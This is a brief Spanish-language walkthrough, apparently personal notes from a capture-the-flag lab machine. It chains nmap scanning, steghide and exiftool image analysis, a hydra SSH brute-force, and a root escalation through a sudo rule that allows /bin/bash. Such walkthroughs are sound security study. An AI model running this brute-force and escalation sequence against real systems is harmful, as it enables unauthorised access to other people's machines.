1. Realizamos un [[00. Apuntes/01. Herramientas/NMAP|NMAP]] hacia la IP objetivo:
`nmap -p- -sS -sCV --min-rate 5000 -n -vvv -Pn <IP> -oN <NombreFichero>

2.  Nos muestra el puerto 22 (SSH) y 80 (HTTP) abiertos, navegamos a la web:
![[Pasted image 20241117175040.png]]

3. Descargamos la imagen:
4. Utilizamos métodos de esteganografía (steghide):
`steghide extract -sf <nombre imagen descargada>`
- Al no tener passphrase le damos a `ENTER` y nos descarga un archivo llamado `secreto.txt`
- Vemos el contenido del fichero `cat secreto.txt`

5. No nos muestra información relevante así que buscaremos por los metadatos (exiftool):
`exiftool <imagen>`
- Se nos muestra que hay un usuario guardado

6. Atacamos al puerto 22 (SSH) por fuerza bruta [[HYDRA]]:
`hydra -l <usuario> -P <wordlist>  ssh://<IP>`
- Encontramos la contraseñas

7. Accedemos por SSH:
`ssh usuario@IP`

8. Escalada de privilegios:
`sudo -l`
- Vemos que podemos usar el comando `/bin/bash` como root
- Usamos `sudo -u root /bin/bash` y tendríamos privilegios de administrador root